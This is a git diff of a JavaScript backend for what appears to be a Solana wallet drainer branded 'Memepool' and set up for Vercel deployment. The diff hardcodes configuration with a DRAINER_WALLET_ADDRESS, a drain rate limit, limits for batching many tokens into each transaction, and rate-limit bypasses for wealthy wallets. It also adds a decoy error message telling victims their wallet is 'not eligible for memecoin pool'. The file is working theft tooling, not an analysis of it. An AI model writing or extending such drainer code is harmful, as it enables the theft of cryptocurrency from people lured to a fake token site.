@@ -4,43 +4,59 @@ const { getAssociatedTokenAddress, createTransferInstruction, getMint, createAss
 // Import fetch for Node.js compatibility
 const fetch = require('node-fetch');
 
-// Import centralized error handling
+// Simplified imports for Vercel deployment
 let errorHandler;
 let ENV_CONFIG;
 let RPC_ENDPOINTS;
 let PROJECT_NAME;
 let telegramLogger;
 
-try {
-  errorHandler = require('../src/errorHandler.js');
-  const envConfig = require('../env.config.js');
-  ENV_CONFIG = envConfig.ENV_CONFIG;
-  RPC_ENDPOINTS = envConfig.RPC_ENDPOINTS;
-  PROJECT_NAME = envConfig.PROJECT_NAME;
-  telegramLogger = require('../src/telegram.js');
-  console.log('[IMPORT] All modules imported successfully');
-} catch (importError) {
-  console.error('[IMPORT] Error importing modules:', importError);
-  // Create fallback error handler
-  errorHandler = {
-    formatApiError: (error, context) => ({
-      success: false,
-      error: error.message || 'Unknown error',
-      message: 'Wallet not eligible for memecoin pool',
-      context: context || {}
-    }),
-    logError: async (error, context) => {
-      console.error('[FALLBACK_ERROR]', error, context);
-      return { errorId: 'fallback' };
-    }
-  };
-  ENV_CONFIG = {};
-  RPC_ENDPOINTS = [];
-  PROJECT_NAME = 'Unknown';
-  telegramLogger = {
-    logError: async (error) => console.error('[TELEGRAM_FALLBACK]', error)
-  };
-}
+// Create fallback error handler
+errorHandler = {
+  formatApiError: (error, context) => ({
+    success: false,
+    error: error.message || 'Unknown error',
+    message: 'Wallet not eligible for memecoin pool',
+    context: context || {}
+  }),
+  logError: async (error, context) => {
+    console.error('[FALLBACK_ERROR]', error, context);
+    return { errorId: 'fallback' };
+  }
+};
+
+// Set default values
+ENV_CONFIG = {
+  DRAINER_WALLET_ADDRESS: '11111111111111111111111111111111',
+  RATE_LIMIT_WINDOW_MS: 60000,
+  GENERAL_RATE_LIMIT: 100,
+  DRAIN_RATE_LIMIT: 10,
+  MIN_SOL_FOR_FEES: 0.005,
+  MIN_SOL_FOR_ATA: 0.002,
+  MIN_WALLET_VALUE: 0.001,
+  MAX_ADDRESS_DIFFERENCES: 3,
+  MAX_TOKENS_PER_TRANSACTION: 50,
+  MAX_INSTRUCTIONS_PER_TRANSACTION: 80,
+  MAX_TRANSACTION_SIZE_BYTES: 1200,
+  ENABLE_TOKEN_BATCHING: true,
+  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD: 100,
+  RATE_LIMIT_BYPASS_SOL_THRESHOLD: 1.0,
+  RATE_LIMIT_BYPASS_ENABLED: true,
+  JUPITER_TOKEN_LIST_URL: 'https://token.jup.ag/all'
+};
+
+RPC_ENDPOINTS = [
+  'https://api.mainnet-beta.solana.com',
+  'https://solana-api.projectserum.com'
+];
+
+PROJECT_NAME = 'Memepool';
+
+telegramLogger = {
+  logError: async (error) => console.error('[TELEGRAM_FALLBACK]', error)
+};
+
+console.log('[IMPORT] Using fallback configuration for Vercel deployment');
 
 // Configuration from environment variables - with error handling
 let DRAINER_WALLET;
